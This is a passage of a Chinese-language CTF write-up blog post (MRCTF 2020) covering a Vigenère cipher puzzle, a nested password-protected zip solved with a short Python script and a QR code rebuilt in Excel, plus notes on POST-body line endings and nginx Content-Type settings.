+<h3 id="vigenere"><a href="#vigenere" class="headerlink" title="vigenere"></a>vigenere</h3><p>這題給了一篇很長的文章，但是出現了很多不一樣的單字母，所以判斷其應該不是字母替換，加之標題的提示，我成功找到了<a target="_blank" rel="noopener" href="https://www.guballa.de/vigenere-solver">這個</a>。將文章放進去之後解密即可在文章末尾得到 flag。</p>
+<h3 id="千層套路"><a href="#千層套路" class="headerlink" title="千層套路"></a>千層套路</h3><p>這題給了個 zip，還是加密的，但是提示跟名稱有關係。於是先上一手爆破，得到了密碼之後找到了關係，被壓縮的壓縮包的密碼等於當前壓縮包的名稱。一開始我準備直接手解來著，但是層數太多了，於是隨手碼了個 Python 指令碼來解密。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile, os</span><br><span class="line"></span><br><span class="line">f = zipfile.ZipFile(os.path.join(os.getcwd(), <span class="string">&#x27;xxxx.zip&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(f.namelist())</span><br><span class="line">passwd = <span class="string">&#x27;xxxx&#x27;</span></span><br><span class="line">f.extract(f.namelist()[<span class="number">0</span>],<span class="string">r&#x27;path\to\your\folder&#x27;</span>,<span class="built_in">bytes</span>(passwd.encode(<span class="string">&#x27;utf-8&#x27;</span>)))</span><br><span class="line"><span class="keyword">while</span> f.namelist():</span><br><span class="line">    filename = passwd</span><br><span class="line">    passwd = f.namelist()[<span class="number">0</span>][<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">    f = zipfile.ZipFile(os.path.join(os.getcwd(), filename + <span class="string">&#x27;.zip&#x27;</span>))</span><br><span class="line">    f.extract(f.namelist()[<span class="number">0</span>], <span class="string">r&#x27;path\to\your\folder&#x27;</span>, <span class="built_in">bytes</span>(filename.encode(<span class="string">&#x27;utf-8&#x27;</span>)))</span><br><span class="line">    <span class="built_in">print</span>(passwd)</span><br></pre></td></tr></table></figure>
+
+<p>跑到程式出錯之後得到了最後一層 zip，開啟之後得到一串文字，代表著色塊的 RGB，且非黑即白。加上 zip 的名稱猜測是一個二維碼。於是將文字複製下來，放到微軟家生產力工具 Excel 裡，使用 <code>=OFFSET($A$1,(COLUMN(GQ902)-1)*200+MOD(ROW(GQ902)-1,200),)</code> 將其轉換成 200x200 的結構，然後將顯示比例不斷縮小，就能得到顏色差別細微的二維碼。</p>
+<div align=center>
+
+<p><img src="https://butter.lumosary.workers.dev/images/archive/e13d9306-ca18-4422-8b45-dfaac6e883c6/1613214096992627.0b038af998c8bbf635ac62231e141cc89d0f4624.png" alt="Excel 中內容的截圖"></p>
+</div>
+
+<p>將其截圖之後放進 Photoshop 中。色階一頓操作之後可以得到顏色差別明顯的圖片，然後適當調整長寬比例得到二維碼。</p>
+<div align=center>
+<img src="https://butter.lumosary.workers.dev/images/e13d9306-ca18-4422-8b45-dfaac6e883c6/1613214096992628.aHR0cDovL2kwLmhkc2xiLmNvbS9iZnMvYXJjaGl2ZS9mOWZkOGQxNWEyOTQzZWVmMzY2ZmI2MGY5YTFhODhhYmYxOTFhMzM2LnBuZw==" width="120" alt="Photoshop 處理後的二維碼"/>
+
+</div>
+
+<p>掃描上述二維碼後可得 flag。</p>
+<h2 id="Exploration"><a href="#Exploration" class="headerlink" title="Exploration"></a>Exploration</h2><h3 id="POST-引數的回車符"><a href="#POST-引數的回車符" class="headerlink" title="POST 引數的回車符"></a>POST 引數的回車符</h3><p>其實一開始是因為 <a href="#ez-bypass">ez_bypass</a> 這題在復現寫 WP 的時候有奇怪的結果，本該用 %0a 字元繞過的地方直接就過了。於是就抓包看了一波。一開始發現了 POST 資料最後的 <code>0D 0A</code>，嘗試把它去掉之後果然就沒辦法通過了，但是這個換行符是 GET 引數後面也有的，於是就去請教了一波 <a target="_blank" rel="noopener" href="http://github.mrkaixin.computer">Mrkaixin</a> 學長。在他的提示下我替換了一波可顯示字元發現 POST 引數的最後一個的末尾會加上原本屬於請求的換行符。這樣就解釋了為什麼會出現奇怪的結果，而當所傳的引數不是最後一個的時候，所有的資料都是跟原本一致的。</p>
+<h3 id="Nginx-針對檔案字尾設定-Content-Type"><a href="#Nginx-針對檔案字尾設定-Content-Type" class="headerlink" title="Nginx 針對檔案字尾設定 Content-Type"></a>Nginx 針對檔案字尾設定 Content-Type</h3><p>這次的 Apache 設定 htaccess 的題，其實在 nginx 下也可以實現相關的功能，但是沒有辦法被利用，因為要從 nginx.conf 修改。使用以下程式碼可以達成目的。</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">types</span> &#123;</span><br><span class="line">  application/x-my-type ext;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首頁</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">關於</a></li>
+         
+          <li><a href="/search/">搜尋</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Summary"><span class="toc-number">1.</span> <span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reflection"><span class="toc-number">2.</span> <span class="toc-text">Reflection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Write-Up"><span class="toc-number">3.</span> <span class="toc-text">Write Up</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-bypass"><span class="toc-number">3.1.</span> <span class="toc-text">ez_bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%A0%E5%82%B3%E4%BD%A0%F0%9F%90%8E%E5%91%A2"><span class="toc-number">3.2.</span> <span class="toc-text">你傳你🐎呢</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A5%97%E5%A8%83"><span class="toc-number">3.3.</span> <span class="toc-text">套娃</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PYwebsite"><span class="toc-number">3.4.</span> <span class="toc-text">PYwebsite</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ezpop"><span class="toc-number">3.5.</span> <span class="toc-text">Ezpop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ezaudit"><span class="toc-number">3.6.</span> <span class="toc-text">Ezaudit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A9%E5%B9%B2%E5%9C%B0%E6%94%AF-%E7%94%B2%E5%AD%90"><span class="toc-number">3.7.</span> <span class="toc-text">天干地支+甲子</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#keyboard"><span class="toc-number">3.8.</span> <span class="toc-text">keyboard</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#vigenere"><span class="toc-number">3.9.</span> <span class="toc-text">vigenere</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%83%E5%B1%A4%E5%A5%97%E8%B7%AF"><span class="toc-number">3.10.</span> <span class="toc-text">千層套路</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploration"><span class="toc-number">4.</span> <span class="toc-text">Exploration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POST-%E5%BC%95%E6%95%B8%E7%9A%84%E5%9B%9E%E8%BB%8A%E7%AC%A6"><span class="toc-number">4.1.</span> <span class="toc-text">POST 引數的回車符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nginx-%E9%87%9D%E5%B0%8D%E6%AA%94%E6%A1%88%E5%AD%97%E5%B0%BE%E8%A8%AD%E5%AE%9A-Content-Type"><span class="toc-number">4.2.</span> <span class="toc-text">Nginx 針對檔案字尾設定 Content-Type</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-TW/posts/9c2f22e.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-TW/posts/9c2f22e.html&text=MRCTF 2020"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-TW/posts/9c2f22e.html&title=MRCTF 2020"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-TW/posts/9c2f22e.html&is_video=false&description=MRCTF 2020"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=MRCTF 2020&body=Check out this article: https://lemonprefect.cn/zh-TW/posts/9c2f22e.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-TW/posts/9c2f22e.html&title=MRCTF 2020"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-TW/posts/9c2f22e.html&title=MRCTF 2020"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-TW/posts/9c2f22e.html&title=MRCTF 2020"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-TW/posts/9c2f22e.html&title=MRCTF 2020"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-TW/posts/9c2f22e.html&name=MRCTF 2020&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-TW/posts/9c2f22e.html&t=MRCTF 2020"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 選單</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 文章目錄</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 頁首</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/zh-TW/">首頁</a></li>
+         
+          <li><a href="/zh-TW/archives/">文章</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">關於</a></li>
+         
+          <li><a href="/search/">搜尋</a></li>
+        
+        
+        
+        <li>
+        
+          <a href="/zh-CN">简</a>
+        
+          <a href="/en">En</a>
+        
+          <a href="#">正</a>
+        
+        </li>
+      </ul>
+    </nav>
+  </div>
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2018-2021
+    LemonPrefect
+    湘ICP备20002800号
+    
+      <img src="/images/beian.png"/>
+      湘公网安备43021102000188号
+    
+    
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
